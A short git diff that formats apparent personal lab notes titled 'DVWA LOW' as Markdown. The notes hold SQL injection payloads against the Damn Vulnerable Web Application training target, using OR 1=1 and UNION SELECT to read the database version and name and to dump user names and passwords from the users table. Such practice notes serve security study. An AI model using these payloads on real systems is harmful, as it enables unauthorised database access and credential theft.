@@ -1,5 +1,6 @@
-DVWA LOW
+# DVWA LOW
 
+```
 1' OR 1=1#
 1' OR 1=1 UNION SELECT 1, VERSION()#
 1' OR 1=1 UNION SELECT 1,DATABASE() #
@@ -17,3 +18,4 @@ DVWA LOW
 
 #Select specified column from the table users
 1' OR 1=1 UNION SELECT user, password FROM users #
+```
